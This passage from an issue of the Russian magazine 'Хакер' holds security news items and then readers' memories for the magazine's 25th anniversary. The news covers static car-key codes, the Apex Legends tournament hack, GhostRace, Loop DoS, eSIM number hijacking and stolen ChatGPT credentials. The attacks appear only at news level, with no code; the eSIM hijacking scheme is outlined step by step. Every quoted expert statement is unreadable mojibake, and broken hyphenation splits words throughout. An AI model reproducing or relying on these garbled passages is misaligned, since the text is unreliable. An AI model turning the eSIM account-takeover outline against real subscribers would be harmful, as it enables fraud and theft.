  скользящий код, когда каждое нажатие кноп ки брелока генерирует раз ный
  зашифрованный радиосиг нал. Это помога ет предотвратить базовые ата ки,
  для которых нужен только радиомодуль за пару долларов.
    В свою очередь, статичес кий код — это фиксирован ный набор цифр,
  который использовали ста рые системы кон троля доступа. Такой сигнал дос-
   таточно перехватить один раз, и затем можно бесконечно вос производить
  его для получения доступа. И хотя автомобили, использующие статические
   коды, были сняты с производства примерно двад цать лет назад, многие
  из них до сих пор на ходу.


         «Îñíîâíàÿ óÿç âèìîñòü òàêèõ àâòîìîáèëåé çàê ëþ÷à åòñÿ â òîì, ÷òî èõ
        ðàäèîñèãíàëû ìîæíî ëåãêî ïåðåõâàòèòü è âîñ ïðîèçâåñòè áåç ñëîæíûõ «
        èíñ òðó ìåíòîâ. Ïî ñóòè, ñòà òè÷åñ êèå êîäû íàñ òîëüêî íåáåçîïàñ íû, ÷òî
         èõ ìîæíî „õàê íóòü“ äàæå ñ ïîìîùüþ êóñ êà ïðîâîäà, ïîä êëþ ÷åííîãî
          ê  âõîäó äëÿ ìèê ðîôîíà, — ïèøóò ñïå öèàëèñ òû. — Ýòîò ïðèìåð
        äåìîíñ òðèðóåò àáñóð äíîñòü âñåõ ïîïûòîê çàï ðåòèòü òàêèå óñòðîéñòâà,
          êàê  Flipper  Zero. Äëÿ çàùèòû îò ïåðåõâàòà ðàäèîñèãíàëîâ ïðèø-
         ëîñü áû çàï ðåòèòü âñþ ýëåê òðîíèêó, â òîì ÷èñ ëå è íàóø íèêè, à ýòî
        íåðå àëüíî».                 »

 В 18 РАЗ МЕНЬШЕ СЕРЫХ SIM-КАРТ
   Оборот серых SIM-карт в РФ снизился в 18 раз по ито гам 2023 года, согласно данным Рос-
   комнадзора. За год власти изъ яли около 4000 таких SIM, тогда как в 2022 году их было
   74 000. Сни жение нелегаль ных продаж эксперты объясня ют ужесточени ем законодательства.

   Из 4000 изъятых SIM-карт более 800 принадлежали «Билайну», свы ше 1200 — «МегаФону»,
   более 800 — МТС, более 1000 — Tele2 и еще более 90 — другим опе рато рам связи.

   На иболь шее количество серых SIM-карт изъяли в Санкт-Петербурге (763 шту ки), ХМАО (715)
   и Крас ноярском крае (642).





 АТАКА НА ТУРНИР
 APEX LEGENDS
  Компания Electronic Arts была вынуждена отложить финалы тур нира Apex
  Legends Global Series (ALGS) в Север ной Америке, после того как хакеры
  взло мали профессиональных игроков пря мо в ходе тур нирного матча. Учас-
   тникам тур нира подключили wallhack (воз можность видеть сквозь стены)
  и aimbot (автоприцеливание и отсутс твие отдачи и разброса во время стрель-
   бы).
    Во вре мя мат ча между командами DarkZero и Luminosity в игровом клиенте
  одного из игро ков DarkZero, Genburten, внезап но появился и заработал
   чит-инструмент TSM HALAL HOOK, интерфейс которого можно было заметить
  на экра не. В результате пос традавший получил воз можность видеть позиции
   всех остальных участни ков игры на кар те и был вынуж ден покинуть матч, а в
  его команде стало на одно го челове ка мень ше.
    Вместо того чтобы анну лировать результаты этой игры, EA прос то объяви-
  ла команду Luminosity победи телем и перешла к сле дующему мат чу.
    Однако хакеры продол жили атаку и на этот раз активировали aimbot игроку
  из команды TSM под ником ImperialHal. ImperialHal оставался на сервере
  (решив, что он просто не будет стрелять) до тех пор, пока организаторы
  не вме шались и не остановили матч. После игра заблокировала его, обна-
  ружив работающее читер ское ПО. Его товарищ по команде, Verhulst, тоже
  получил бан.
     Предполага ется, что ата ка была осу щест влена хакерами под никами
   Destroyer2009 и R4ndom, чьи ники можно было заметить в окне чата
  Genburten в момент взлома.





  Вско ре  пос ле  это го  происшествия офи циальные  представители  Apex
  Legends Esports объявили, что северо американские финалы будут отло жены,
  пока организаторы не обезопасят соревнования от внеш него вмешатель-
   ства.
     Позже человек, назвавший ся Destroyer2009, со общил пользователю X
   AntiCheatPD, который собира ет информа цию о читах в видеоиграх, что он
  использовал некую RCE-уяз вимость для взлома клиентов игроков ALGS.
  Предполагаемый злоумыш ленник не уточ нил, имелась ли в виду уязвимость
   в самом кли енте Apex Legends, во встроенном ПО Easy Anti-Cheat или в
   каком-то другом софте.
     Те перь в сети обсуждается множес тво теорий о том, как мог быть реали-
  зован взлом ALGS, сре ди которых: RCE-уязвимость в клиенте Apex Legends,
   уязвимость в Easy Anti-Cheat и даже заранее спланиро ванный взлом устрой-
   ств игро ков задол го до начала матчей.
     Из-за поднявшей ся шумихи разработчики Easy Anti-Cheat были вынуждены
  сде лать официальное заявление. Они пишут, что провели рассле дование
  и убеждены в том, что в их соф те нет никаких RCE-уяз вимостей.
    Но каким бы образом ни про изошел взлом, это беспрецедентный случай,
  пос коль ку рань ше игро ков ни разу не взламыва ли в пря мом эфи ре и из-за
   этого не приходилось останавливать тур ниры.





 ТИМ БЕРНЕРС-ЛИ О БУДУЩЕМ ВЕБА
   Сэр Тимоти Бернерс-Ли, ученый, соз датель веба и действующий глава «Консорциума Всемир-
   ной паутины», опуб ликовал от крытое пись мо, в котором заявил, что интернет может серьезно
   постра дать из-за концентра ции власти и утраты «духа децентрализации». Ниже мы про цити-
   руем отрывок из его пос лания.

             «Три с половиной десятилетия назад, когда я изобрел веб, его траекторию →          невозможно было предугадать. Не сущес твовало „дорожной карты“, позволя-
        ющей предсказать ход его развития, и это была увлекательная одиссея, полная
         неп редви денных воз можнос тей и проб лем.
          В основе всей его инфраструктуры лежало намерение обес печить условия
          для сотрудни чес тва, стимулировать сострадание и генерировать творчество. Он
         дол жен был стать инс трументом, рас ширя ющим воз можности человечес тва.
           Первое десяти летие сущес твования Сети оправдало это обещание. Однако
          в пос леднее десятилетие вместо того, чтобы воплощать эти ценности, веб,
         наоборот, стал играть роль их раз рушителя. Последствия этого становятся все
         более мас штабными. От централизации плат форм до революции в области
          искусственного интеллекта — веб служит основой нашей онлайн-экосистемы,
          которая сегод ня меня ет геопо литичес кий ландшафт, стимулирует эко номичес-
          кие сдви ги и вли яет на жизни людей по всему миру.
             Пять лет назад, ког да вебу исполнилось 30 лет, я говорил о некото рых проб-
          лемах, вызванных тем, что в вебе доминируют корыс тные инте ресы ряда кор-
          пораций, которые подорвали цен ности веба и привели к его разрушению и при-
          чинению вреда. Теперь, когда мы приб лижаемся к 35-летию веба, стремитель-
         ное развитие ИИ усугубило эти проблемы, доказав, что проблемы веба не изо-
         лированы, а скорее глубоко переп летены с развивающимися технологиями.
           Первая из этих проб лем — это степень концентрации власти, которая про-
          тиворечит децентра лизованному духу, который я задумывал изначально.
            Это при вело к сегмента ции интернета и борь бе за то, чтобы удержать поль-
          зователей на одной платформе, чтобы оптимизи ровать при быль за счет пас-
          сивного наблюдения за контентом. Эта эксплуататорская бизнес-модель осо-
         бенно опас на во время выборов, которые могут привести к полити ческим пот-
          рясени ям.
             Эту проб лему усугуб ляет вторая — рынок пер сональных данных, который
          эксплуати рует время и данные людей, создавая углубленные профили, поз воля-
        ющие размещать целевую рекламу и в итоге кон тролировать информацию,
         которую потребляют люди.
            Будущее зависит от нашей способности как рефор мировать существу ющую
          сис тему, так и создать новую, которая действи тельно будет отве чать инте ресам
          человечества. Для этого мы дол жны разрушить информационные барьеры, что-
        бы сти мули ровать сотрудничество, сфор мировать рыночные условия, в которых
          разнообразие  вариантов  будет  способс твовать  творчеству,  и  перейти
          от поляризации контента к среде, сфор мирован ной разнообразием голосов
         и точек зрения, которая будет способс тво вать сопере жива нию и пониманию», —
         пишет Тим Бернерс-Ли.





                                        Продолжение статьи →
← Начало статьи





 ПРОЦЕССОРАМ
 УГРОЖАЕТ
 GHOSTRACE
  Груп па иссле дователей разработа ла новую side-channel-атаку GhostRace,
  позволя ющую спровоцировать утеч ку данных на современных про цессорах.
  Проблема затрагивает не только процес соры Intel, AMD, ARM и IBM, под-
  держивающие спе кулятив ное выполнение, но и популярное ПО.
     Эксперты из IBM и Амстердамского сво бодного университета опи сывают
  GhostRace (CVE-2024-2193) как спекулятивное состояние гонки (speculative
   race condition, SRC). Такая ата ка позволяет извлечь из памяти потенциально
  конфиденциальную информацию, нап ример пароли и ключи шифрования.
  Однако для осуществления атаки потребу ется физичес кий или привиле гиро-
  ванный доступ к целевой машине, то есть эксплу атация этой проблемы
  на практике весьма сложная задача.
    Сос тояние гонки воз ника ет в том случае,  ког да нес колько потоков
  одновре менно пытаются получить дос туп к общему ресурсу, что может при-
  вести к воз никновению уяз вимостей, которые мож но использовать по-раз-
   ному, включая выполнение произвольного кода, обход средств защиты
  и извлечение данных.
     Для пре дот вращения возникновения таких ситу аций современные ОС
  используют примитивы синхронизации, одна ко про веденный иссле дователя-
  ми анализ показал, что состояние гонки можно сочетать со спе кулятив ным
  выполнени ем.


        «Íàø ãëàâ íûé âûâîä çàê ëþ÷à åòñÿ â òîì, ÷òî âñå ðàñ ïðîñòðà íåííûå
        ïðèìèòèâû  ñèíõðîíèçà öèè,  ðåàëèçîâàííûå  ñ ïîìîùüþ  óñëîâíûõ «
         ïåðåõîäîâ, ìîæíî ìèê ðîàð õèòåê òóðíî îáîéòè íà ñïå êóëÿòèâ íûõ ïóòÿõ
         ñ ïîìîùüþ àòà êè Spectre v1 (CVE-2017-5753), ïðîâîöèðóÿ âî âñåõ
         êðèòè÷åñ êèõ race-free-îáëàñòÿõ ñïå êóëÿòèâ íîå ñîñ òîÿíèå ãîíêè (SRC),
         ÷òî ïîç âîëèò çëîóìûø ëåííèêàì èçâëå êàòü èíôîðìà öèþ èç öåëåâîãî
         ÏÎ», — ïîÿñ íèëè èññëå äîâà òåëè.                 »





  Для того чтобы провести атаку и «выиг рать» спе куля тивную гонку, выпол нение
  про цесса-жер твы дол жно быть прервано в нужный момент и удержано, так
   как злоумыш ленник должен выполнить  то, что иссле дова тели называют
  SCUAF-ата кой (Speculative Concurrent Use-After-Free).
     Для этой цели уче ные использовали новую тех нику атак под наз вани ем
   Inter-Process Interrupt  (IPI) Storming, которая заключается в переполнении
  про цессорного ядра целевого процес са. В ито ге они продемонстри ровали
  SCUAF-ата ку на ядро Linux, при водив шую к утечке информации из памяти
  ядра со ско ростью 12 Кбайт в секунду.
     Хо тя иссле дование было сосредото чено на архитектурах x86 и Linux,
  экспер ты заяви ли, что атаке подвержены про дукты дру гих производителей,
  а также другое ПО, помимо Linux.

        «Â öåëîì ïåðåä SRC óÿç âèìî ëþáîå ïðîãðàì ìíîå îáåñ ïå÷åíèå, íàï-
        ðèìåð îïå ðàöèîííàÿ ñèñ òåìà, ãèïåð âèçîð è òàê äàëåå, ðåàëèçóþùåå «
        ïðèìèòèâû ñèíõðîíèçà öèè ÷åðåç óñëîâíûå ïåðåõîäû áåç êàêîé ëèáî
        ñåðèàëèçóþùåé èíñ òðóê öèè è ðàáîòà þùåå íà ëþáîé ìèê ðîàð õèòåê-
         òóðå (íàï ðèìåð, x86, ARM, RISC-V è òàê äàëåå), êîòîðàÿ ïîç âîëÿåò
         ñïå êóëÿòèâ íî âûïîëíÿòü óñëîâíûå ïåðåõîäû», — ãîâîðÿò èññëå äîâà-
          òåëè.                 »
  Инженеров Intel, AMD, ARM и IBM уве домили о проблеме GhostRace еще в
  конце 2023 года, а они, в свою очередь, уже сооб щили об уязвимости про-
  изводителям ОС и гипервизоров.
    В допол нение к сво ей статье в блоге и техничес кому документу иссле-
  дователи уже опубликовали PoC-эксплоит для GhostRace, скрип ты, пред-
  назна ченные для сканирования ядра Linux на наличие гаджетов SCUAF, а так-
  же спи сок уже выяв ленных проблемных гаджетов.


 ФИШИНГОВЫХ САЙТОВ СТАЛО В 3,6 РАЗА БОЛЬШЕ

   Согласно данным CERT-FACCT (бывшая Group-IB), доля фишинговых ресур сов, расположен ных
   в доменной зоне .ru, за прошед ший год вырос ла в 3,6 раза — с 12,9% в конце 2022 года
   до 46,5% по сос тоянию на конец 2023 года.

   Эту тенденцию подтвержда ют и в ГК «Солар», где сообщают, что при мерно 50% всех заб-
   локированных ресурсов было зарегис трировано в рунете.


   По данным проекта «Доменный пат руль» (входит в Координационный центр национальных
   доменов), в 2023 году в зоне .ru было выявлено 45 918 фишин говых доменов, что сос тавляло
  0,84% от общего числа зарегистрированных в ней имен. Для сравнения: в 2022 году в рунете
   нас читыва лось 15 336 фишинговых доменов.





 ХАКЕРЫ УГОНЯЮТ
 ESIM
  Спе циалисты FACCT обнаружили попытки кра жи мобильных номеров у рос-
  сий ских поль зовате лей для получе ния доступа к их онлайн-банкингу. Угон
  номеров про исходит с помощью подмены или вос становления eSIM — встро-
  енной цифровой кар ты, выполняющей в некоторых смар тфонах функции
  физической SIM-кар ты.
    Иссле дователи говорят, что с осе ни 2023 года зафиксирова ли уже более
   ста попыток входа в личные кабинеты клиентов в онлайн-сер висах только
   у одной финан совой организации.
     Чтобы получить доступ к чужому мобильному номеру, злоумышленники
  используют функцию замены или вос ста новления циф ровой SIM-кар ты:
  переносят телефон жертвы на собственное устройство с eSIM.
     Для перехвата номера с использовани ем eSIM-профилей мошенникам
  требуется смар тфон, поддерживающий подклю чение профиля eSIM, ском-
  про метирован ная учетная запись жер твы в личном кабинете у оператора свя-
  зи или в популярном государственном сервисе.
     Отмечается, что за рубежом ана логич ный спо соб угона киберпреступни ки
  используют уже не меньше года, тогда как в Рос сии первые попытки были
  зафиксирова ны осенью 2023 года.
     Раньше для уго на аккаунтов зло умышленники (с помощью сообщников
  на стороне операто ра) пытались перевыпус тить SIM-карту без ведома
  самого абонента, но опе раторы и банки ввели жес ткие меры противодей-
   ствия этому виду мошенничества.
    Поэто му в новой схе ме для получения QR-кода или кода активации адреса
  SM-DP+ (который в eSIM отвечает за генерацию и защиту про филей) зло-
  умыш ленни ки сами создают заявку на сайте или в приложении операто ра
  на перевод номера с физической карты на eSIM. Как только злоумышленник
  завершает этот процесс, пользователь уже не может использовать свою SIM-
  карту и теряет доступ к номеру.

         «Ïîëó÷èâ äîñ òóï ê ìîáèëüíîìó òåëåôîííîìó íîìåðó æåð òâû, êèáåð-
        ïðåñ òóïíèêè  ìîãóò  ïîëó÷èòü êîäû äîñ òóïà,  äâóõôàêòîð íîé  àóòåí- «
        òèôèêà öèè ê ðàç ëè÷íûì ñåð âèñàì, âêëþ ÷àÿ áàíêè, ìåñ ñåíäæå ðû, ÷òî
         îòêðû âàåò ïåðåä çëîóìûø ëåííèêàìè ìàñ ñó âîç ìîæíîñ òåé äëÿ ðåàëè-
        çàöèè ïðåñ òóïíûõ ñõåì. Âàðèàöèé ñõå ìû ìíîæåñ òâî, íî áîëüøå âñå ãî
       ìîøåííèêîâ  èíòå ðåñó þò  ñåð âèñû  îíëàéí áàíêèíãà.  Ñîîáùåíèÿ
         ñ êîäîì ïîä òâåðæäå íèÿ, êîòîðûå áóäóò ïðèõîäèòü íà íîìåð, ïîç âîëÿò
         ñíÿòü âñå äåíüãè ñî ñ÷å òà æåð òâû, îôîð ìèòü êðå äèòû», — êîì ìåíòè-
         ðóåò Äìèòðèé Äóä êîâ, ñïå öèàëèñò äåïàð òàìåíòà Fraud Protection êîì-
        ïàíèè FACCT.                 »
  Что бы защитить ся от подобной угрозы, спе циалис ты совету ют сле довать
  прос тым рекомендациям:
   • ис поль зовать сложные пароли  (оригинальный  для  каждого сервиса
     и устройства) и менять их раз в квартал;
   • вклю чить везде, где есть такая фун кция, двухфакторную идентификацию
     и никогда не сообщать этот код кому-либо по телефону и не вводить
     на сторон них ресурсах;
   • вниматель но следить за приходя щими SMS о блокировке, перевыпус ке
     или переносе SIM-кар ты.


  225 000 УЧЕТНЫХ ДАННЫХ ДЛЯ CHATGPT
   Более 225 000 логов сти леров, содер жащих укра ден ные учетные дан ные для ChatGPT, были
   дос тупны в даркнете в пери од с января по октябрь 2023 года, сообщили в Group-IB.

   Учетные данные в основном обнаруживаются в логах таких инфостилеров, как LummaC2,
  Raccoon и RedLine.

  В период с июня по октябрь 2023 года было совершено более 130 000 взло мов уни кальных
   хос тов  с  дос тупом  к  OpenAI  ChatGPT,  что  на 36%  боль ше,  чем  за  первые  пять
   месяцев 2023 года.

   LLM (такие как ChatGPT) могут использовать ся злоумыш ленниками для разработ ки новых
  методов атак, под готовки убедитель ных мошен нических и фишинговых кампаний,
   а также для повышения общей операционной эффектив ности.





 БЕСКОНЕЧНЫЙ LOOP
 DOS
  Ис сле дователи описали новый вектор  application-layer-атак, основанный
  на протоко ле UDP и получивший наз вание Loop DoS. Такой DoS пред став ляет
   угро зу для систем Broadcom, Honeywell, Microsoft и MikroTik и может «зам-
   кнуть» сетевые сер висы в бесконечной пет ле, создающей большие объ емы
   трафика.
     Атака  была  разработа на  специалис тами  Центра  информационной
  безопасности имени Гельмгольца в Германии (CISPA) и в целом затрагивает
  око ло 300 тысяч хос тов и свя занных с ними сетей.
     Loop DoS осно вывается на уязвимос ти в имплементации про токо ла UPD,
  который подвержен IP-спуфингу и не обеспечивает надлежащую проверку
   пакетов. Проблема получила основной идентификатор CVE-2024-2169 (а так-
  же CVE-2009-3563 и CVE-2024-1309).
     Злоумышленник, экс плуатирующий  эту уяз вимость, способен создать
  самовос про изводящуюся петлю, генери рующую избы точный трафик, который
  невозможно остановить, что, в свою оче редь, повлечет отказ в обслуживании
  (DoS) целевой сис темы или даже всей сети.





  Loop DoS строится на спу финге IP-адресов и может быть запуще на с одного
  хоста, который отправляет лишь одно сообщение для начала коммуникации.
   Так, по данным CERT/CC, существует три возможных сце нария исполь-
  зования этой проблемы:
   • перегрузка уязвимого сер виса, в резуль тате чего тот становится нес-
     табильным или неп ригод ным для использования;
   • DoS-атака на магис тральную сеть, вызывающая перебои в работе других
     сервисов;
   • атаки с амплификацией, когда сетевые петли при водят к усилению DoS-
     или DDoS-атак.

         «Åñëè äâà application-ñåð âåðà èñïîëüçóþò óÿç âèìóþ èìïëå ìåíòàöèþ
         óêà çàííîãî ïðîòîêîëà,  çëîóìûø ëåííèê ìîæåò èíèöèèðîâàòü  ñâÿçü «
         ñ ïåð âûì ñåð âåðîì, ïîäìåíèâ ñåòåâîé àäðåñ âòîðîãî ñåð âåðà (æåð-
          òâû). Âî ìíîãèõ ñëó ÷àÿõ ïåð âûé ñåð âåð îòâå òèò æåð òâå ñîîáùåíèåì
        îá îøèáêå, ÷òî òàê æå âûçîâåò àíà ëîãè÷ íîå ïîâåäå íèå è äðó ãîå ñîîá-
        ùåíèå îá îøèáêå íà ïåð âîì ñåð âåðå», — îáúÿñíÿþò â CERT/CC.                 »
  В ито ге про цесс будет длить ся до тех пор, пока все дос тупные ресурсы
  не будут полностью исчерпа ны, а серверы не перес танут воспринимать обыч-
  ные запросы.
     Эксперты CISPA предуп реждают, что свя занные с Loop DoS риски очень
  велики и охватывают и устаревшие (QOTD, Chargen, Echo), и современные
  про токо лы (DNS, NTP, TFTP), которые игра ют важнейшую роль в таких базовых
  сетевых функци ях, как синхрониза ция времени, разрешение доменных имен
  и передача файлов без аутентификации.
    На данный момент подтвердили, что их продукты уязвимы перед Loop DoS,
  ком пании Broadcom, Cisco, Honeywell, Microsoft и MikroTik.
     Чтобы избе жать свя занных с Loop DoS рис ков, CERT/CC рекомендует
   установить последние патчи от произво дителей, устра няющие уязвимость,
  или же заменить решения, которые устарели и боль ше не получают обновле-
   ний.


  ДРУГИЕ ИНТЕРЕСНЫЕ СОБЫТИЯ ЭТОГО МЕСЯЦА

   Бес плат ные VPN из Google Play превраща ют смартфоны пользователей в прокси


   GitHub предста вила ИИ-инс трумент, который будет искать уязвимос ти в коде


   Взломанные WordPress-сай ты используют браузеры посетителей для компро метации дру гих
   ресурсов


   Python-разработ чики пос традали от сложной атаки на цепочку поставок


   Проблема GoFetch угрожает процес сорам Apple серии M, а патчи влияют на производитель-
   ность


   Ата ка ArtPrompt использует ASCII-арт против чат-ботов с ИИ


   Разработ чики KDE предупредили об опас ности глобальных тем


  GEOBOX обещает превратить Raspberry Pi в ано нимный инструмент для кибератак


   Даркнет-мар кет плейс Incognito шантажирует собс твен ных поль зователей


   Сотрудни ка Google обви нили в краже ИИ-сек ретов для китай ских компаний
COVERSTORY





В 2024 году «Хакеру» исполняется 25 лет. В честь этого мы
собрали воспоминания читате лей о журнале и о том, какую
роль он сыграл в их жизни. Также в честь юбилея мы объ-
являем вре менную скид ку на подписку до 3000 рублей.
Акция продлится до конца марта.


Под борку мы проиллюстри рова ли нашим новым маскотом — серым полоса-
тым котом, который впервые появился на обложке номера «Опас ный IoT»
и так всем полюбился, что футболки «с котиком» ста бильно разбирали
на каждой конференции и про сили допеча тать еще и еще. Если тебе тоже
нравится котик, то у нас для тебя кое-что есть: стикерпак для Telegram с ним.
  А если захочешь сделать подарок нам, то это очень легко: прос то оформи
под писку на «Хакер»! Даже если она у тебя уже есть, продление на год никог-
да не помешает. Еще лучше, если обра тишь внимание твоей орга низации
на возможность оформить подписку для сотрудни ков. Получен ные деньги мы
вкладываем в новые материалы и улучшение сай та.





Àðòåì

Однажды, будучи подростком, уви дел в киоске журнал и купил. Журнал
помогал скрашивать досуг своими историями из хаксцены, забав ными отве-
тами на вопросы читателей, ну и новинками железа и софта. Вообще, было
интерес но читать прак тически все, что было в журнале!

Àëåêñàíäð


Я поз накомился с «Хакером», ког да учил ся в шко ле, примерно в 9-м клас се
(2007 год). Был у при ятеля в гос тях, он считался «про шаренным» в компь-
ютерной тематике, подрабатывал почин кой компь ютеров на дому. Уви дел
у него дома журнал, попросил почитать. Ничего не понял, но было интересно.
   «Хакер» подстег нул мой интерес  к  IT, замотивиро вал искать ответы
на непонятные вопросы. Когда я его читал, я не понимал абсолютно ничего,
хотя знал, что в жур нале описаны довольно интересные темы. Вчи тывался,
определял для себя незнакомые понятия, выяс нял, какое зна чение они име ют
в компьютерном мире, и постепенно начинал вникать в суть статей. Этот опыт
помог уже и во вре мя работы инженером, когда приходилось поз навать суть
про цессов и вещей, с которыми рань ше никогда не стал кивался.
   Будучи сту дентом, я иног да покупал себе «Хакер» в печатном виде.
Однажды уви дел на прилавке киоска журнал с диском, на котором был образ
только что вышедшей Ubuntu 18.04. Я давно хотел попробовать Linux, и встре-
чу с данным номером журнала я посчитал руководством к дей ствию. Купил
журнал, в обще житии попробовал установить Ubuntu второй сис темой,
но случайно (конечно же, из-за незнания и спешки) стер абсолют но все раз-
делы и унич тожил всю информа цию. Повезло, что никаких важных отчетов
и кур совых работ на нем не было, иначе бы исто рия была куда более трагич-
ная, но такой вот опыт я получил.





Elgens

На протяже нии  пяти  лет был дос туп  к  «печат ной просрочке» (2009–
2014 годы): покупал по дешевке печат ную вер сию с задержкой два-три
месяца от выпуска, с тех пор так и читаю вас.
  Я нем ножко админю в нес кольких небольших офи сах, в кур се «дырочек»
благодаря новос тному раз делу.
  Однажды про сек, что все под кон трольные мне роуте ры ASUS в одном бот-
нете! Была статья, как сос нифать трафик самого роутера, начал пробовать,
и вот выяс нилось! Хардре сет ситуацию не исправлял, пришлось руч ками про-
шивать все шесть штук, фанатизм к данной мар ке резко поутих, зато почувс-
тво вал себя вай тха кером. По-моему, это был Gafgyt.





Àëåêñàíäð

Стал покупать бумажный журнал, ког да работал в Мос кве в 1999 году.
В 99-м был веселый журнал, пом ню раз дел «Западлостроение», были
какие-то статьи о компьютер ных играх. Скра шивал жизнь в чужом городе.

Àíäðåé


Впервые купил «Хакер» в киос ке печати в мет ро из-за вызывающе го наз-
вания. Благодаря статьям получал отве ты на многие воп росы и вызовы
на работе в ИБ. Во многих случаях те проблемы, что были по работе,
решались через статьи в свежих выпусках журнала.

Ñåðãåé

В далеком 2003 году в очеред ном спец выпуске под названием «Оси 4 work»
была статья про 1С, в которой были слова «тачка не куплена, да и компу
апгрейд нужен...». Меня эта тема зацепила, и я решил освоить эту систему,
которая, по завере нию автора статьи, поз волит «и тачку купить, и компушник
про апгрейдить». Прош ло 20 лет, уже и квартира куп лена, дом достраивается,
про тач ки с компушни ком вообще молчу. Вот так, с подачи вашего журнала,
при шел к успе ху!





Àíòîí

Это мои ранние учебники, бла годаря журналу я увлекся ИБ.

Rubber

Я читал «Хакер» в бумаге и электронные версии такого рода жур налов еще в
эпо ху FidoNet. Бла годаря «Хакеру» регуляр но штудирую отче ты о сливах пер-
соналки, знакомлюсь с обзорами уязвимос тей и тестов надежности разных
средств ком муникации. Пользовался рекомендаци ями «Хакера» для тес-
тирования надеж ности шиф рования тра фика и защиты ЛВС. Однажды обна-
ружил попыт ку взло ма моего ком па на работе в ЛВС крупной ком пании
и немед ленно в ответ перезагрузил напада ющий комп. Больше подоб ных
попыток не отме чал, но местная служба безопасности неожиданно потеп лела
ко мне. Нап ример, когда про токолом безопасности персоналу запретили
любое использование флеш-носителей, я про должал спокой но пользоваться
у них на глазах.

Äàíèÿð

В 2001 году, когда я учился в институте, одно курсник как-то принес журнал
на пары, он мне пон равился, с тех пор я начал покупать в киосках. Я начал
увле кать ся кодин гом, читать книги, которые рекомен довали в кон це журнала.
На лекции в институте по предмету «Статистика» у меня как-то порвался
пакет, в котором я что-то долго искал, в нем лежали конспекты и журнал
«Хакер». Именно в тот момент, когда препод проходил возле меня, все
содержимое вывалилось на пол. Пре под увидел это, поднял журнал, про-
бежал глазами по обложке, взглянул на меня и молча передал его мне. Я,
весь в краске, собрал все с пола и сло жил в одну стоп ку. Когда был зачет
по это му пред мету (я был не подготовлен), нас всех по одному приглашали
за стол. Пре под был очень строгий, в воз расте. Я пошел в конце, сел нап-
ротив него и сказал, что я не готов. Он вспомнил про тот слу чай, когда
из пакета вывалился журнал, и начал задавать вопросы о содержимом этого
журнала. В ито ге мы с ним минут 15–20 беседовали о тех нологиях, о хакерах
и так далее. В конце он мне поставил зачет, со словами, что не хотел бы меня
видеть хакером, и пожелал, что бы я доучился как следует, выпустился спе-
циалис том!





NENser

Как-то раз в школьные годы (конец 90-х) мы с моим дядей останови лись
у киос ка с прессой и он спросил, купить ли мне что-нибудь. Мой взгляд упал
на журнал «Хакер», не пом ню уже, что там было на обложке, но я смотрел
на него как заворо женный. Я попросил купить его, на что дядя ответил: «Нет,
тебе это слишком рано» — и купил жур нал CHIP. Как будущий хакер я не мог
смириться с ограничениями, осо бенно касающимися доступа к информации.
Я пообещал себе, что обязательно накоп лю денег и куплю его сам. Так и про-
изош ло. Постепенно узна вая что-то новое из «Хакера», я искал допол нитель-
ную информа цию о том, что было в стать ях. Я вырос в этой сфере. Можно
сказать, что «Хакер» помог мне определить ся с профессией и любимым
делом, стал для меня главным триггером, который запус тил во мне инте рес
к информационной (без)опасности. Сейчас я работаю пен тесте ром уже
более десяти лет.

Âàäèì


Однажды увидел бумажный журнал в киос ке «Роспечати». Обалдел, когда
узнал, что, ока зывается, есть такие люди, которые ломают системы и прог-
раммы. Поэто му в 2000 году выбрал тогда казав шуюся крайне неизвес тной
спе циальность «компьютерная безопас ность».





Äìèòðèé

Увидел инфу про журнал, почитал статьи, и они пон равились, стал покупать
и кни ги по этой тематике и, конечно же, оформил подписку на год. И потом
прод лил еще на год. В итоге уже вто рой год являюсь читате лем «Хакера». Он
помог мне рас ширить зна ния и узнать про новые технологии и кни ги.

Âëàäèìèð

«Хакер» впервые уви дел в ларь ке «Рос печати» в 2000 году. Вдох новили
Tips’n’Tricks, которые можно было показывать одноклассни кам! А также более
сложные статьи про реверс железа, подбор SQL-инъ екций и так далее.
Из «Хакера» я получил обзорные знания обо всех IT-технологиях, получил
ком плексное видение  от пай ки электро ники и прошив ки контроллеров
до работы про токолов высокого уров ня. Но главное — это вдохновение
и чувство свободы начала двухтысячных. Была клас сная акция: принеси нам
бутылку или банку чего-то и получи журнал! Мы с дру гом при ехали из другого
города в Москву ради такого, сфотог рафиро вались с главным редактором
и получи ли журналы с автографами!





Àëåêñàíäð Äìèòðèåâ

«Хакер» был модным и популяр ным журналом в конце девянос тых. Он
в какой-то степени определял моду пос ле жур нала Ptюч. По инс трукциям жур-
нала мне удалось починить настрой ки монитора, который после перехода
в спящий режим почему-то открывался в чудовищном разрешении. В школе я
категоричес ки не любил читать. За все вре мя учебы я едва прочитал десяток
книг, а часть из них по сокращен ным сбор никам. Но, поступив в матема тичес-
кую школу, я увлекся прог рамми рованием, и мне стало инте ресно всё
про компьюте ры. Тог да-то я и стал читать журнал. Читал его от первой до пос-
ледней полосы, каж дый месяц успе вая закончить номер еще до выхода сле-
дующе го. Потом добави лись книж ки по прог рамми рованию. После по эко-
номи ке, пси хологии,  исто рии, нон-фикшен и множес тво произведений
художес твенной литературы. Но точно помню, что чтение в мою жизнь пришло
с журналом «Хакер».





Ìèðàæ

На этой работе, где я сейчас тру жусь, ока зались журналы еще 2000-х годов.
«Хакер», оказывается, здесь раньше выписывали. Так я стал обладателем
некоторых даже не вскры тых копий журналов с дисками.
  Новости Xakep.ru о найденных уяз вимостях всегда держали в курсе. Осо-
бенно в период «не-Пети», WannaCry и EternalBlue. К тому же они зас тавляют
раз бираться в протоколах и других экс плу ати руемых на этот момент объ-
ектах. Ломали нас как-то через RDP и пос ле шифровали (в то время скомпро-
метированный сервер еще не был в моем ведоме). Письмо, оставленное
хакером, у меня до сих пор лежит. Видел исто рии, как люди (еще молодые)
попадались на социаль ную инже нерию, в этом случае урок сто ил все-
го 50 тысяч руб лей. И более 100 тысяч на покуп ку обо рудования, которое так
и лежит.

Ñòàíèñëàâ

«Хакер» погрузил меня в мир интересного. Много примеров из журнала испы-
тывалось в локальной сети города! Ронялся городской узел связи... Я стал
одним из известных компьютер щиков города.





Ïàâåë

22 года назад у меня появился первый компьютер, мне тогда было 16 лет.
Поначалу был инте рес только к играм, но через полгода уже было инте ресно,
как это все работает. Прав да, в связи с отсутс твием интерне та и книг в нашем
маленьком город ке мои воп росы так и оставались без ответа. Но как-то чис то
слу чай но зашел в отделение Почты России и уви дел, что у них можно выписы-
вать журналы. Собс твен но, там я и увидел жур нал «Хакер» (на то время
«Спец» еще не было, хотя он мне пон равился больше, там было больше
полез ной информации), на тот момент я как раз только начал получать сти-
